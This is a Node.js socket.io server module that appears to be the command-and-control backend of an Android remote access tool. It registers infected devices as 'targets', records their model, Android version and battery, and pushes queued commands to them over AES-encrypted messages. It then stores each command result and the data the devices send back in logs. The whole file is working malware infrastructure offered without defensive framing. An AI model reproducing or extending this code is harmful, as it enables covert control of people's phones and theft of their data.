const { decryptPayload, encryptPayload } = require('../crypto/aes');
const { getDb } = require('../routes/db');

const onlineTargets = new Map();

function socketHandler(io) {
    io.on('connection', (socket) => {
        console.log('🔌 New socket connection:', socket.id);

        socket.on('register', async (data) => {
            try {
                const payload = decryptPayload(data);
                const { uuid, device_info } = payload;
                onlineTargets.set(uuid, socket);
                socket.targetUuid = uuid;

                const db = getDb();
                await db.run(`
                    UPDATE targets SET last_seen = CURRENT_TIMESTAMP, status = 'online',
                    device_name = ?, android_version = ?, model = ?, manufacturer = ?
                    WHERE uuid = ?
                `, [device_info.device_name || 'Unknown', device_info.android_version || 'Unknown',
                    device_info.model || 'Unknown', device_info.manufacturer || 'Unknown', uuid]);

                // Kirim perintah pending
                const pending = await db.all(`
                    SELECT * FROM commands WHERE target_uuid = ? AND status IN ('pending','sent')
                    ORDER BY created_at ASC
                `, [uuid]);
                for (const cmd of pending) {
                    const encrypted = encryptPayload({
                        command_id: cmd.id,
                        command: cmd.command,
                        params: JSON.parse(cmd.params || '{}')
                    });
                    socket.emit('command', encrypted);
                    await db.run('UPDATE commands SET status = "sent" WHERE id = ?', [cmd.id]);
                }

                socket.emit('registered', encryptPayload({ status: 'active', interval: 60000 }));
            } catch (e) {
                console.error('Socket register error:', e);
            }
        });

        socket.on('result', async (data) => {
            try {
                const payload = decryptPayload(data);
                const { command_id, result, type } = payload;
                const uuid = socket.targetUuid;
                const db = getDb();
                if (command_id) {
                    await db.run(`
                        UPDATE commands SET status = 'completed', result = ?, executed_at = CURRENT_TIMESTAMP
                        WHERE id = ?
                    `, [JSON.stringify(result), command_id]);
                }
                if (type && result) {
                    await db.run(`
                        INSERT INTO logs (target_uuid, type, data)
                        VALUES (?, ?, ?)
                    `, [uuid, type, JSON.stringify(result)]);
                }
                await db.run('UPDATE targets SET last_seen = CURRENT_TIMESTAMP WHERE uuid = ?', [uuid]);
            } catch (e) {
                console.error('Socket result error:', e);
            }
        });

        socket.on('heartbeat', async (data) => {
            try {
                const payload = decryptPayload(data);
                const { uuid, battery } = payload;
                const db = getDb();
                await db.run('UPDATE targets SET last_seen = CURRENT_TIMESTAMP, battery = ? WHERE uuid = ?', [battery, uuid]);
            } catch (e) {
                console.error('Heartbeat error:', e);
            }
        });

        socket.on('disconnect', () => {
            if (socket.targetUuid) {
                onlineTargets.delete(socket.targetUuid);
                const db = getDb();
                db.run('UPDATE targets SET status = "offline" WHERE uuid = ?', [socket.targetUuid]);
                console.log(`🔴 Target offline: ${socket.targetUuid}`);
            }
        });
    });
}

function getOnlineTargets() {
    return onlineTargets;
}

module.exports = { socketHandler, getOnlineTargets };
